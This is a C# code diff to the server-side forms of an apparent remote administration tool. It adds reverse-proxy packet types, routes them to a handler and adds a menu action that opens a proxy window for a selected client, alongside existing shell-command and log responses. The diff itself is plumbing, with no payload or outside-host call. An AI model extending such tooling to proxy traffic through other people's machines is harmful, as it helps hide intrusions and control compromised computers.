@@ -9,6 +9,7 @@ using xServer.Core.Extensions;
 using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Packets;
+using xServer.Core.ReverseProxy;
 using xServer.Settings;
 
 namespace xServer.Forms
@@ -143,7 +144,11 @@ namespace xServer.Forms
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
-                typeof (Core.Packets.ClientPackets.GetLogsResponse)
+                typeof (Core.Packets.ClientPackets.GetLogsResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
             });
 
             ListenServer.ServerState += ServerState;
@@ -288,6 +293,12 @@ namespace xServer.Forms
             else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
             {
                 CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
+            }
+            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
+                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
+                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
+            {
+                ReverseProxyCommandHandler.HandleCommand(client, packet);
             }
         }
 
@@ -705,5 +716,20 @@ namespace xServer.Forms
         }
 
         #endregion
+
+        private void ctxtReverseProxy_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.FrmProxy != null)
+                {
+                    c.Value.FrmProxy.Focus();
+                    return;
+                }
+                FrmReverseProxy frmRS = new FrmReverseProxy(c);
+                frmRS.Show();
+            }
+        }
     }
 }
